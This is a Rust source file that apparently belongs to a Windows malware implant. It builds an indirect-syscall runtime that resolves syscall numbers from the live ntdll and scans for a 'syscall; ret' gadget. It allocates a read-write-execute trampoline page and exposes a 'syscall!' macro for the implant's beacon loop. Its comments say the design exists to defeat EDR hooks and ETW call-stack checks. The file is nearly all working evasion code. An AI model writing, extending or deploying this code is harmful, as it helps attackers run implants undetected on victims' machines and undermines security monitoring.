//! Indirect-syscall runtime.
//!
//! This is the capstone that turns `nyx_evasion` from a unit-tested algorithm
//! into a live runtime: it
//!   1. resolves the SSN table over the live ntdll (via `resolve::LiveNtdll`),
//!   2. scans ntdll for a `syscall; ret` gadget (the address an indirect stub
//!      jumps into so the executing RIP/return address land in ntdll),
//!   3. emits the indirect stub bytes (`nyx_evasion::indirect_stub`) into
//!      executable memory and invokes it,
//!   4. exposes a `syscall!` macro + typed wrappers for the Nt* calls the
//!      implant needs.
//!
//! Why indirect: a direct syscall executes `syscall` from implant memory, so
//! the return address points outside any legitimate module — ETW/EDR call-stack
//! checks flag it. Indirect jumps to a `syscall` *inside ntdll*, so RIP and the
//! return address look legitimate. SSN resolution (Hell/Halo/Tartarus) recovers
//! the real numbers even when EDRs hook the stub prologues.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::{djb2, LiveNtdll};
use nyx_evasion::stub::indirect_stub;

/// The resolved syscall runtime: SSN table + the ntdll `syscall` gadget address
/// + a writable/executable trampoline page the indirect stubs are copied into.
pub struct Runtime {
    /// (api name, SSN) for every resolvable syscall.
    table: Vec<(String, u32)>,
    /// Absolute address of a `syscall; ret` gadget inside ntdll.
    syscall_gadget: u64,
    /// A single RWX page used as the indirect-syscall trampoline. The beacon
    /// loop is single-threaded, so one reusable page is safe and avoids leaking
    /// a new page per call. (RWX is the simplest W^X-relaxed option here; a
    /// stricter design would flip RW→RX per call, but that needs VirtualProtect
    /// on every invocation.)
    trampoline: *mut u8,
}

impl Runtime {
    /// Build the runtime: locate ntdll, resolve SSNs, find the gadget, allocate
    /// the RX trampoline page. Returns None if any step fails (should never
    /// happen in a real process).
    pub unsafe fn init() -> Option<Self> {
        let ntdll = LiveNtdll::locate()?;
        let table = ntdll.resolve_table_owned();
        let syscall_gadget = scan_syscall_gadget(&ntdll)?;
        // One page of executable memory. PAGE_EXECUTE_READWRITE (0x40),
        // MEM_COMMIT|MEM_RESERVE (0x3000). Resolved via the PEB walk.
        let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
        type VirtualAlloc =
            unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void;
        let f: VirtualAlloc = core::mem::transmute(va);
        let page = f(
            core::ptr::null_mut(),
            0x1000,
            0x3000,
            0x40, // PAGE_EXECUTE_READWRITE
        );
        if page.is_null() {
            return None;
        }
        Some(Self {
            table,
            syscall_gadget,
            trampoline: page as *mut u8,
        })
    }

    /// Look up the SSN for an API by name hash.
    pub fn ssn_by_hash(&self, name_hash: u32) -> Option<u32> {
        // The table holds String names; hash each to match. (Linear scan; the
        // table is a few hundred entries — fine for cold-path resolution.)
        for (name, ssn) in &self.table {
            if djb2(name.as_bytes()) == name_hash && *ssn != u32::MAX {
                return Some(*ssn);
            }
        }
        None
    }

    /// The ntdll `syscall; ret` gadget address (for indirect stubs).
    pub fn gadget(&self) -> u64 {
        self.syscall_gadget
    }

    /// Build the indirect-syscall stub bytes for `ssn`, ready to write into
    /// executable memory and call.
    pub fn indirect_stub_for(&self, ssn: u32) -> Vec<u8> {
        indirect_stub(ssn, self.syscall_gadget)
    }

    /// Write the indirect stub for `ssn` into the trampoline page and return a
    /// typed function pointer to it. Single-threaded (beacon loop only), so no
    /// locking is needed — each call rewrites the same page before invoking.
    ///
    /// # Safety
    /// Caller must pass a real SSN resolved from the live ntdll table, and the
    /// pointed-to function must be invoked with arguments matching the target
    /// syscall's signature (Win64 calling convention; first 4 args in
    /// rcx/rdx/r8/r9, rest on stack).
    pub unsafe fn trampoline_for(&self, ssn: u32) -> *const u8 {
        let stub = indirect_stub(ssn, self.syscall_gadget);
        // The trampoline page is 0x1000 bytes; a stub is ~23. Always fits.
        core::ptr::copy_nonoverlapping(stub.as_ptr(), self.trampoline, stub.len());
        self.trampoline as *const u8
    }
}

/// Scan ntdll's image for a `syscall; ret` byte pair (`0F 05 C3`) and return
/// its absolute address. The first Nt* export stub contains one; any works as
/// the indirect-jump target.
unsafe fn scan_syscall_gadget(ntdll: &LiveNtdll) -> Option<u64> {
    // Scan ntdll for the first `syscall; ret` (0F 05 C3) gadget. Read the whole
    // scan range in one shot (not per-byte) to avoid 60k tiny allocations.
    let start = 0x1000u32;
    let end = 0x10000u32;
    let blob = ntdll.read(start, (end - start) as usize);
    for i in 0..blob.len().saturating_sub(2) {
        if blob[i] == 0x0F && blob[i + 1] == 0x05 && blob[i + 2] == 0xC3 {
            let rva = start + i as u32;
            return Some(ntdll.module().base as u64 + rva as u64);
        }
    }
    None
}

/// Invoke an indirect syscall by name. Looks up the SSN, writes the indirect
/// stub into the runtime's trampoline page, and calls it as a 4-argument
/// Win64 function returning i32 (NTSTATUS).
///
/// # Safety
/// `rt` must outlive the call and be initialized. Arguments are passed
/// verbatim; the caller is responsible for argument count/types matching the
/// target syscall. Extra (>4) arguments are not supported by this helper —
/// extend with variadic wrappers if needed.
pub unsafe fn syscall4(
    rt: &Runtime,
    name_hash: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> Option<i32> {
    let ssn = rt.ssn_by_hash(name_hash)?;
    let stub_addr = rt.trampoline_for(ssn);
    // The stub tail is `jmp r11` (no `ret`), so it returns into *our* caller
    // via the ntdll `syscall; ret` gadget — meaning the callee is effectively
    // `extern "system" fn(usize,usize,usize,usize) -> i32` from Rust's POV: the
    // syscall's own ret pops the return address we pushed. Cast and call.
    type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
    let f: Stub = core::mem::transmute(stub_addr);
    Some(f(a1, a2, a3, a4))
}

/// A typed wrapper around an indirect syscall. Resolves the SSN by name hash
/// and invokes the indirect trampoline with up to 4 arguments, returning the
/// NTSTATUS. Usage: `let status = syscall!(rt, b"ntdelayexecution", 0, &interval as *const _ as usize, 0, 0);`
#[macro_export]
macro_rules! syscall {
    ($rt:expr, $name:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr) => {
        $crate::syscalls::syscall4($rt, $crate::resolve::djb2($name), $a1, $a2, $a3, $a4)
    };
    // SSN-only form (no invocation) — kept for callers that just need the number.
    ($rt:expr, $name:expr) => {
        $rt.ssn_by_hash($crate::resolve::djb2($name))
    };
}

/// Resolve the SSN for `NtAllocateVirtualMemory` (the canonical first syscall
/// an implant makes — proves the runtime is live).
pub fn ssn_nt_allocate_virtual_memory(rt: &Runtime) -> Option<u32> {
    rt.ssn_by_hash(djb2(b"ntallocatevirtualmemory"))
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(target_arch = "x86_64")]
    #[test]
    fn djb2_keys_are_stable() {
        // The names the runtime looks up must hash consistently with the table.
        assert_eq!(
            djb2(b"ntallocatevirtualmemory"),
            djb2(b"NTALLOCATEVIRTUALMEMORY")
        );
    }
}
